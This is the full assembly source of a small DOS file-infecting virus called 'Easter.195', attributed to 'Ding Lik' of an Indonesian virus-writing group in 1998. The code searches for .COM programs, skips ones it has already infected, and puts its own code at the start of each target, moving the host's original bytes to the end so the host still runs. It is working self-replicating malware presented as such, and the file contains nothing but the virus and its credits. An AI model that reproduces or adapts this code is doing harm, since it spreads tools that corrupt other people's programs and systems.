         NAME	Easter
         TITLE	The 'Easter' virus, version Easter.195

; ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ                Jakarta, Indonesia - 12/04/98 [DD/MM/YY]                   บ
; บ              HARM Software Virus division, Virus Research                 บ
; บ                                                                           บ
; บ                 The 'Easter' virus, version 'Easter.195'                  บ
; บ                                                                           บ
; บ     (c)Copyright by Ding Lik and Virus division, Virus Research, 1998     บ
; ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

	Ideal
	Model	Tiny
	DataSeg
	 VirLength	= EOV - Mulai
	 Label		Buffer	Byte
	CodeSeg
	StartUpCode
	Radix	16
Mulai:
	push es
	mov ax, cs
	add ax, 1000
	mov es, ax
	push es
	mov di, 100
	mov si, di
	mov cx, VirLength
	rep movsb
	lea si, [Utama]
	push si
	retf
Utama:
	pop es

	push cs
	pop ds

	push ds es
	pop ds
	mov cx, VirLength
	mov si, [PrgAsli]
	mov di, 100
	rep movsb
	pop ds

	push cs
	pop es

	mov ah, 1a
	lea dx, [EOV]
	int 21

	mov ah, 4e
	lea dx, [Korban]
	mov cx, 27
	int 21
	jc Keluar

	mov ax, 3d02
	lea dx, [EOV + 1e]
	int 21
	xchg ax, bx
	jc Keluar

	mov ah, 3f
	mov cx, VirLength
	lea dx, [Buffer]
	int 21
	cmp ax, cx
	jb TutupFile

	mov cx, 10
	xchg di, dx
	mov si, 100
	rep cmpsb
	jnz Infeksi

TutupFile:
	mov ah, 3e
	int 21

Keluar:
	push ss ss
	pop ds
	mov ah, 1a
	mov dx, 80
	int 21
	mov di, 100
	push di
	push ss
	pop es
	xor ax, ax
	xor cx, cx
	cwd
	xor bx, bx
	xor si, si
	xor di, di
	retf

Infeksi:
	mov ax, 4200
	xor cx, cx
	cwd
	int 21

	push [PrgAsli]
	mov ax, [Word EOV + 1a]
	inc ah
	mov [PrgAsli], ax

	mov ah, 40
	mov cx, VirLength
	mov dx, 100
	int 21
	pop [PrgAsli]

	mov ax, 4202
	xor cx, cx
	cwd
	int 21

	mov ah, 40
	mov cx, VirLength
	lea dx, [Buffer]
	int 21
	jmp TutupFile

PrgAsli	dw 0
Korban	db '*.COM', 0
EOV	db 43 dup (?)
	End
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฏฏ Please don't spread this source code! ฎฎฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
; ฤฤฤฤฤฤฤฤฤฤฏฏ I don't want somebody sue me bcoz of this virii ฎฎฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
 		      Ding Lik of HARM Software, Indonesia